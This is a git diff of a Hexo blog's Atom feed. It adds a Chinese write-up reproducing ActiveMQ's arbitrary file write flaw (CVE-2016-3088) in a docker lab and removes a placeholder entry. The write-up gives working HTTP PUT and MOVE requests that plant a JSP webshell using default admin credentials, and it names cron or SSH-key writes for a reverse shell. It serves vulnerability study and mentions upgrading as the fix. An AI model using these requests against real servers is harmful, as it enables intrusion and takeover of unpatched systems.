@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://s40d1.github.io/"/>
-  <updated>2020-10-16T15:48:22.811Z</updated>
+  <updated>2020-10-17T02:55:22.909Z</updated>
   <id>https://s40d1.github.io/</id>
   
   <author>
@@ -15,6 +15,35 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title></title>
+    <link href="https://s40d1.github.io/wiki/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ActionMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88cve-2016-3088%EF%BC%89%E5%A4%8D%E7%8E%B0/"/>
+    <id>https://s40d1.github.io/wiki/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ActionMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88cve-2016-3088%EF%BC%89%E5%A4%8D%E7%8E%B0/</id>
+    <published>2020-10-17T02:57:56.532Z</published>
+    <updated>2020-10-17T02:55:22.909Z</updated>
+    
+    <content type="html"><![CDATA[<hr><h2 id="title-ActiveMQ任意文件写入漏洞（CVE-2016-3088）复现"><a href="#title-ActiveMQ任意文件写入漏洞（CVE-2016-3088）复现" class="headerlink" title="title:ActiveMQ任意文件写入漏洞（CVE-2016-3088）复现"></a>title:ActiveMQ任意文件写入漏洞（CVE-2016-3088）复现</h2><h1 id="ActiveMQ任意文件写入漏洞（CVE-2016-3088）"><a href="#ActiveMQ任意文件写入漏洞（CVE-2016-3088）" class="headerlink" title="ActiveMQ任意文件写入漏洞（CVE-2016-3088）"></a>ActiveMQ任意文件写入漏洞（CVE-2016-3088）</h1><p>[TOC]</p><h2 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h2><p>搭建及运行漏洞环境：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>环境监听61616端口和8161端口，其中8161为web控制台端口，本漏洞就出现在web控制台中。</p><p>访问<code>http://your-ip:8161/</code>看到web页面，说明环境已成功运行。</p><h2 id="二、背景简述"><a href="#二、背景简述" class="headerlink" title="二、背景简述"></a>二、背景简述</h2><p>ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。</p><p>fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：</p><ol><li>其使用率并不高</li><li>文件操作容易出现漏洞</li></ol><p>所以，ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf/jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。</p><p>在测试过程中，可以关注ActiveMQ的版本，避免走弯路。</p><h2 id="三、影响版本"><a href="#三、影响版本" class="headerlink" title="三、影响版本"></a>三、影响版本</h2><p>Apache ActiveMQ 5.0.0 - 5.13.2</p><h2 id="四、漏洞详情"><a href="#四、漏洞详情" class="headerlink" title="四、漏洞详情"></a>四、漏洞详情</h2><p>本漏洞出现在fileserver应用中，漏洞原理其实非常简单，就是fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。</p><p>文件写入有几种利用方法：</p><ol><li>写入webshell</li><li>写入cron或ssh key等文件</li><li>写入jar或jetty.xml等库和配置文件</li></ol><p>写入webshell的好处是，门槛低更方便，但前面也说了fileserver不解析jsp，admin和api两个应用都需要登录才能访问，所以有点鸡肋；写入cron或ssh key，好处是直接反弹拿shell，也比较方便，缺点是需要root权限；写入jar，稍微麻烦点（需要jar的后门），写入xml配置文件，这个方法比较靠谱，但有个鸡肋点是：我们需要知道activemq的绝对路径。</p><h2 id="五、漏洞防御"><a href="#五、漏洞防御" class="headerlink" title="五、漏洞防御"></a>五、漏洞防御</h2><p>1、ActiveMQ Fileserver 的功能在 5.14.0 及其以后的版本中已被移除。建议用户升级至 5.14.0 及其以后版本。</p><h2 id="六、漏洞利用案例"><a href="#六、漏洞利用案例" class="headerlink" title="六、漏洞利用案例"></a>六、漏洞利用案例</h2><h3 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h3><p>前面说了，写入webshell，需要写在admin或api应用中，而这俩应用都需要登录才能访问。</p><p>默认的ActiveMQ账号密码均为<code>admin</code>，首先访问<code>http://your-ip:8161/admin/test/systemProperties.jsp</code>，查看ActiveMQ的绝对路径：</p><p><img src="https://note.youdao.com/yws/public/resource/dc2268167e3b898780f887c2e8638a5f/88FC9AB842434754928CC65F32248EAD?ynotemdtimestamp=1602903244523" alt="image"></p><p>然后上传webshell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;fileserver&#x2F;1.txt HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8161</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 120976</span><br><span class="line"></span><br><span class="line">webshell...</span><br></pre></td></tr></table></figure><p><img src="https://note.youdao.com/yws/public/resource/dc2268167e3b898780f887c2e8638a5f/12472748CA26493C99C5BB14B04CF546?ynotemdtimestamp=1602903244523" alt="image"><br>访问文件内容如如下：<br><img src="https://note.youdao.com/yws/public/resource/dc2268167e3b898780f887c2e8638a5f/229A09183670423EAB97E4DE60418B30?ynotemdtimestamp=1602903244523" alt="image"></p><p>移动到web目录下的api文件夹（<code>/opt/activemq/webapps/api/s.jsp</code>）中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MOVE &#x2F;fileserver&#x2F;1.txt HTTP&#x2F;1.1</span><br><span class="line">Destination: file:&#x2F;&#x2F;&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;api&#x2F;1.jsp</span><br><span class="line">Host: localhost:8161</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><p><img src="https://note.youdao.com/yws/public/resource/dc2268167e3b898780f887c2e8638a5f/7E74CAB5510F4F0A93881145E574B86F?ynotemdtimestamp=1602903244523" alt="image"></p><p>成功访问webshell，表明webshell写入成功：</p><p><img src="https://note.youdao.com/yws/public/resource/dc2268167e3b898780f887c2e8638a5f/91850F5EF4D74E93A320159AD2BB6B0B?ynotemdtimestamp=1602903244523" alt="image"></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;hr&gt;
+&lt;h2 id=&quot;title-ActiveMQ任意文件写入漏洞（CVE-2016-3088）复现&quot;&gt;&lt;a href=&quot;#title-ActiveMQ任意文件写入漏洞（CVE-2016-3088）复现&quot; class=&quot;headerlink&quot; title=&quot;title:Act
+      
+    
+    </summary>
+    
+    
+      <category term="渗透" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
+    
+      <category term="Web渗透" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/"/>
+    
+      <category term="漏洞复现" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>ActiveMQ 反序列化漏洞（CVE-2015-5254）复现</title>
@@ -526,30 +555,6 @@
     
     
       <category term="代码审计" scheme="https://s40d1.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>article title</title>
-    <link href="https://s40d1.github.io/wiki/CTF/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/"/>
-    <id>https://s40d1.github.io/wiki/CTF/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</id>
-    <published>2020-06-23T16:13:37.000Z</published>
-    <updated>2020-06-23T16:15:55.811Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="第一篇文章"><a href="#第一篇文章" class="headerlink" title="第一篇文章"></a>第一篇文章</h1>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h1 id=&quot;第一篇文章&quot;&gt;&lt;a href=&quot;#第一篇文章&quot; class=&quot;headerlink&quot; title=&quot;第一篇文章&quot;&gt;&lt;/a&gt;第一篇文章&lt;/h1&gt;
-      
-    
-    </summary>
-    
-    
-      <category term="CTF" scheme="https://s40d1.github.io/categories/CTF/"/>
     
     
   </entry>
